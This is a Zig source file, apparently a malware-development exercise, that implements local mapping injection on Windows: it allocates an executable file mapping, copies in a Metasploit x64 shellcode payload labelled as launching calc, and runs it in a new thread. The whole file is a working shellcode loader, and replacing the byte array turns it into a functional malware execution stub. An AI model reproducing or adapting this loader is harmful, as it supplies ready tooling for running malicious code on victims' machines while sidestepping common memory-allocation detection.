const std = @import("std");
const print = std.debug.print;
const windows = std.os.windows;

const HANDLE = windows.HANDLE;
const INVALID_HANDLE_VALUE = windows.INVALID_HANDLE_VALUE;
const WINAPI = windows.WINAPI;
const DWORD = windows.DWORD;
const BOOL = windows.BOOL;
const PVOID = windows.PVOID;
const SIZE_T = windows.SIZE_T;
const PBYTE = [*]u8;

// Memory protection constants
const PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE;

// File mapping constants
const FILE_MAP_WRITE: DWORD = 0x2;
const FILE_MAP_EXECUTE: DWORD = 0x20;

// x64 calc metasploit shellcode
const payload = [_]u8{
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,
};

// External Windows API functions
extern "kernel32" fn CreateFileMappingW(
    hFile: HANDLE,
    lpFileMappingAttributes: ?*windows.SECURITY_ATTRIBUTES,
    flProtect: DWORD,
    dwMaximumSizeHigh: DWORD,
    dwMaximumSizeLow: DWORD,
    lpName: ?[*:0]const u16,
) callconv(WINAPI) ?HANDLE;

extern "kernel32" fn MapViewOfFile(
    hFileMappingObject: HANDLE,
    dwDesiredAccess: DWORD,
    dwFileOffsetHigh: DWORD,
    dwFileOffsetLow: DWORD,
    dwNumberOfBytesToMap: SIZE_T,
) callconv(WINAPI) ?PVOID;

extern "kernel32" fn UnmapViewOfFile(lpBaseAddress: PVOID) callconv(WINAPI) BOOL;

extern "kernel32" fn CreateThread(
    lpThreadAttributes: ?*windows.SECURITY_ATTRIBUTES,
    dwStackSize: SIZE_T,
    lpStartAddress: windows.LPTHREAD_START_ROUTINE,
    lpParameter: ?PVOID,
    dwCreationFlags: DWORD,
    lpThreadId: ?*DWORD,
) callconv(WINAPI) ?HANDLE;

extern "kernel32" fn WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD) callconv(WINAPI) DWORD;
extern "kernel32" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;

// Thread start routine type
const LPTHREAD_START_ROUTINE = *const fn (?PVOID) callconv(WINAPI) DWORD;

// Allocate a local `Mapped` executable buffer and copy the payload to it
// Return the base address of the payload
fn localMapInject(pPayload: []const u8, ppAddress: *?PVOID) bool {
    var bState: bool = true;
    var hFile: ?HANDLE = null;
    var pMapAddress: ?PVOID = null;

    // Create a file mapping handle with `RWX` memory permissions
    // This doesn't have to allocate `RWX` view of file unless it is specified in the MapViewOfFile call
    hFile = CreateFileMappingW(
        INVALID_HANDLE_VALUE,
        null,
        PAGE_EXECUTE_READWRITE,
        0,
        @intCast(pPayload.len),
        null,
    );

    if (hFile == null) {
        print("[!] CreateFileMapping Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        return bState;
    }

    // Maps the view of the payload to the memory
    // FILE_MAP_WRITE | FILE_MAP_EXECUTE are the permissions of the file (payload) -
    // since we need to write (copy) then execute the payload
    pMapAddress = MapViewOfFile(
        hFile.?,
        FILE_MAP_WRITE | FILE_MAP_EXECUTE,
        0,
        0,
        pPayload.len,
    );

    if (pMapAddress == null) {
        print("[!] MapViewOfFile Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
        bState = false;
        ppAddress.* = null;
        if (hFile) |handle| _ = CloseHandle(handle);
        return bState;
    }

    print("[i] pMapAddress : 0x{X}\n", .{@intFromPtr(pMapAddress.?)});

    waitForEnter("[#] Press <Enter> To Copy The Payload ... ");

    print("[i] Copying Payload To 0x{X} ... ", .{@intFromPtr(pMapAddress.?)});

    // Copy payload to mapped memory
    const dest = @as([*]u8, @ptrCast(pMapAddress.?));
    @memcpy(dest[0..pPayload.len], pPayload);

    print("[+] DONE\n", .{});

    ppAddress.* = pMapAddress;
    if (hFile) |handle| _ = CloseHandle(handle);
    return bState;
}

fn waitForEnter(message: []const u8) void {
    print("{s}", .{message});
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

pub fn main() !void {
    var pAddress: ?PVOID = null;
    var hThread: ?HANDLE = null;

    if (!localMapInject(payload[0..], &pAddress)) {
        return;
    }

    waitForEnter("[#] Press <Enter> To Run The Payload ... ");

    print("[i] Creating New Thread ... ", .{});

    // Cast the payload address to a thread start routine
    const threadFunc = @as(LPTHREAD_START_ROUTINE, @ptrCast(pAddress.?));

    hThread = CreateThread(
        null,
        0,
        threadFunc,
        null,
        0,
        null,
    );

    if (hThread) |handle| {
        _ = WaitForSingleObject(handle, windows.INFINITE);
        print("[+] DONE\n", .{});
        _ = CloseHandle(handle);
    } else {
        print("[!] CreateThread Failed With Error : {}\n", .{windows.kernel32.GetLastError()});
    }

    waitForEnter("[#] Press <Enter> To Quit ... ");
}
